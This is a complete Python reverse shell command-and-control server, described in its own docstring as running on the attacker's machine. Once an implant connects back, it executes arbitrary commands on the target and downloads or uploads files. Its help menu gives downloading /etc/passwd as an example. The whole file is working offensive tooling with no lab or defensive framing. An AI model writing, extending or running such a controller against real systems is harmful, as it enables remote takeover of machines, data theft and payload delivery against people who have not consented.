#!/usr/bin/env python3
"""
Reverse Shell Server (Command & Control)
Runs on the attacker's machine and listens for client connections.
Allows remote command execution and file transfer.
"""

import socket
import json
import base64
import os
import sys

class ReverseShellServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.client_socket = None
        self.client_address = None
        
    def start_server(self):
        """Start the server and listen for connections."""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(1)
            print(f"[+] Server listening on {self.host}:{self.port}")
            print("[*] Waiting for client connection...")
            
            self.client_socket, self.client_address = self.socket.accept()
            print(f"[+] Client connected from {self.client_address[0]}:{self.client_address[1]}")
            return True
        except Exception as e:
            print(f"[-] Error starting server: {e}")
            return False
    
    def send_data(self, data):
        """Send JSON data to the client."""
        try:
            json_data = json.dumps(data)
            self.client_socket.send(json_data.encode())
        except Exception as e:
            print(f"[-] Error sending data: {e}")
            raise
    
    def receive_data(self):
        """Receive JSON data from the client."""
        try:
            data = ""
            while True:
                chunk = self.client_socket.recv(1024)
                if not chunk:
                    return None
                data += chunk.decode()
                try:
                    return json.loads(data)
                except json.JSONDecodeError:
                    continue
        except Exception as e:
            print(f"[-] Error receiving data: {e}")
            return None
    
    def execute_command(self, command):
        """Send a command to the client and receive output."""
        try:
            self.send_data({"type": "command", "command": command})
            response = self.receive_data()
            if response and response.get("type") == "response":
                return response.get("output", "")
            return "No response received"
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def download_file(self, remote_path, local_path=None):
        """Download a file from the client."""
        try:
            if local_path is None:
                local_path = os.path.basename(remote_path)
            
            # Request file from client
            self.send_data({"type": "download", "file_path": remote_path})
            response = self.receive_data()
            
            if response and response.get("type") == "file_content":
                encoded_content = response.get("content", "")
                file_path = response.get("file_path", "")
                
                # Decode and save file
                decoded_content = base64.b64decode(encoded_content)
                with open(local_path, "wb") as f:
                    f.write(decoded_content)
                
                return f"File downloaded successfully: {remote_path} -> {local_path}"
            elif response and response.get("type") == "response":
                return f"Error: {response.get('output', 'Unknown error')}"
            else:
                return "Invalid response from client"
        except Exception as e:
            return f"Error downloading file: {str(e)}"
    
    def upload_file(self, local_path, remote_path):
        """Upload a file to the client."""
        try:
            if not os.path.exists(local_path):
                return f"Error: Local file not found: {local_path}"
            
            if not os.path.isfile(local_path):
                return f"Error: Path is not a file: {local_path}"
            
            # Read and encode file
            with open(local_path, "rb") as f:
                file_content = f.read()
                encoded_content = base64.b64encode(file_content).decode()
            
            # Send file to client
            self.send_data({
                "type": "upload",
                "file_path": remote_path,
                "content": encoded_content
            })
            
            response = self.receive_data()
            if response and response.get("type") == "response":
                return response.get("output", "")
            return "No response received"
        except Exception as e:
            return f"Error uploading file: {str(e)}"
    
    def print_banner(self):
        """Print welcome banner."""
        banner = """
╔═══════════════════════════════════════════════════════════╗
║         Reverse Shell Command & Control Server            ║
╚═══════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def print_help(self):
        """Print help menu."""
        help_text = """
Available Commands:
  <command>              - Execute a system command on the target
  download <remote>      - Download a file from the target
  download <remote> <local> - Download file with custom local name
  upload <local> <remote> - Upload a file to the target
  help                   - Show this help menu
  exit                   - Close the connection and exit
  
Examples:
  dir                    - List directory contents (Windows)
  ls                     - List directory contents (Linux/Mac)
  cd /path/to/dir        - Change directory
  download /etc/passwd   - Download passwd file
  upload script.py /tmp/script.py - Upload script to target
  exit                   - Close connection
        """
        print(help_text)
    
    def run(self):
        """Main interactive shell loop."""
        self.print_banner()
        
        if not self.start_server():
            return
        
        print("\n[+] Connection established! Type 'help' for available commands.\n")
        
        try:
            while True:
                try:
                    # Get user input
                    command = input("shell> ").strip()
                    
                    if not command:
                        continue
                    
                    # Handle special commands
                    if command.lower() == "exit":
                        self.send_data({"type": "command", "command": "exit"})
                        print("[*] Closing connection...")
                        break
                    
                    elif command.lower() == "help":
                        self.print_help()
                        continue
                    
                    elif command.lower().startswith("download "):
                        parts = command.split(" ", 2)
                        if len(parts) == 2:
                            result = self.download_file(parts[1])
                        elif len(parts) == 3:
                            result = self.download_file(parts[1], parts[2])
                        else:
                            result = "Usage: download <remote_path> [local_path]"
                        print(result)
                        continue
                    
                    elif command.lower().startswith("upload "):
                        parts = command.split(" ", 2)
                        if len(parts) == 3:
                            result = self.upload_file(parts[1], parts[2])
                        else:
                            result = "Usage: upload <local_path> <remote_path>"
                        print(result)
                        continue
                    
                    # Execute regular command
                    output = self.execute_command(command)
                    print(output)
                    
                except KeyboardInterrupt:
                    print("\n[!] Interrupted by user")
                    self.send_data({"type": "command", "command": "exit"})
                    break
                except Exception as e:
                    print(f"[-] Error: {e}")
                    continue
        
        except Exception as e:
            print(f"[-] Connection error: {e}")
        finally:
            if self.client_socket:
                self.client_socket.close()
            if self.socket:
                self.socket.close()
            print("[*] Server closed")

def main():
    """Main entry point."""
    if len(sys.argv) != 3:
        print("Usage: python server.py <bind_ip> <port>")
        print("Example: python server.py 0.0.0.0 4444")
        print("         python server.py 127.0.0.1 4444  (for localhost only)")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    server = ReverseShellServer(host, port)
    server.run()

if __name__ == "__main__":
    main()

